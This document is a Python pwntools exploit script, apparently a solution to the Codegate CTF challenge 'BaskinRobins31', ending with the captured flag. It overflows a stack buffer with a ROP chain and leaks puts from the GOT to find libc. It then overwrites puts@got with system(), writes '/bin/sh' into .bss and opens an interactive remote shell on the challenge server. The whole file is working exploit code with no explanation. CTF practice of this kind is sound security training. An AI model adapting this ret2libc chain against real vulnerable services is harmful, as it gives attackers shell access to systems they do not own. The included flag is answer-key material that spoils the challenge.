#!/usr/bin/python

from pwn import * 

#p=process('./BaskinRobins31')
p=remote("ch41l3ng3s.codegate.kr",3131)
puts_off = 0x06f690
system_off = 0x45390
writeable = 0x602090 #.bss
puts_got = 0x00602020
puts_plt = 0x4006c0
mov_3pop = 0x400877
write_plt = 0x4006d0
read_plt = 0x400700

payload = ""
payload += "A"*(176) #Junk
payload += p64(0xcafebabe) #rbp
payload += p64(mov_3pop) # mov rbp, rsp; pop rdi; pop rsi; pop rdx; ret;
payload += p64(0x1) #rdi
payload += p64(puts_got) #puts@got  => addr to read from 
payload += p64(0x8) #rdx-number of bytes to be written to stdout
payload += p64(write_plt) #write@plt



#Stage 1 :overwrite puts@got with system_adr
payload += p64(mov_3pop) #mov rbp, rsp; pop rdi; pop rsi; pop rdx; ret;
payload += p64(0x0) #rdi stdin 
payload += p64(puts_got) #puts@got ==> addr to write to 
payload += p64(0x8) #size to be read
payload += p64(read_plt) #read@plt

#Stage 2 :write /bin/sh to .bss

payload += p64(mov_3pop) #mov rbp, rsp; pop rdi; pop rsi; pop rdx; ret;
payload += p64(0x0) #rdi 
payload += p64(writeable) #rsi adr to write '/bin/sh' to 
payload += p64(0x8) #size to be read from stdin
payload += p64(read_plt) #read@plt


#Stage 3 : set RDI to "/bin/sh" and call system()
payload += p64(mov_3pop) #mov rbp, rsp; pop rdi; pop rsi; pop rdx; ret;
payload += p64(writeable) #rdi ==>adr of '/bin/sh'
payload += p64(0x1) #junk
payload += p64(0x1) #junk
payload += p64(puts_plt) #puts@got which become system()



p.sendline(payload)
p.recvuntil(":(")
leaked_addr = p.recv(8)
puts_libc=hex(u64(leaked_addr))[:-4]
print "[+] Puts is at :"+puts_libc
libc_base = int(puts_libc,16) - puts_off
print "[+] Libc base is", hex(libc_base)
system_addr = libc_base + system_off
print "[+] System() is at", hex(system_addr)
print "[+] Sending system_addr", hex(system_addr)
p.send(p64(system_addr))
print "[+] Sending '/bin/sh'"
p.send("/bin/sh")
p.interactive(">> ")
#flag{The Korean name of "Puss in boots" is "My mom is an alien"}
